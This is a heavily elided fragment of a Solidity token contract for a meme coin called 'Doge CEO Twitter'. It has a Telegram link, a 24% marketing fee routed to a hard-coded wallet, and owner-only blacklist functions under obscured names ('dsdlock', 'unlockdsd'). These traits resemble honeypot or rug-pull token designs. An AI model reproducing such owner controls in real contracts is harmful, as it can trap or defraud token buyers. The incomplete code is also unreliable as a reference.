...
/**
Telegram : https://t.me/CEODOGETWITTER
*/
...
contract DogeCEOTwitter  is Context, IERC20, Ownable {
    ...
    string private constant _name = "Doge CEO Twitter"; // 
    string private constant _symbol = unicode"DCTW"; //    
    uint8 private constant _decimals = 9; // 
    
    
    uint256 public _marketingFee = 24;
    uint256 public _liquidityFee = 1;
    address private  _marketingWallet = 0xF878DCBA20B6DEA631FdAB9F33D21e65C177700B;
...
/*
    ...
    */
    ...
    function dsdlock(address[] calldata addresses) external onlyOwner {
 ...
 // Blacklist - block wallets (REMOVE - COMMA SEPARATE MULTIPLE WALLETS)
    function unlockdsd(address[] calldata addresses) external onlyOwner {
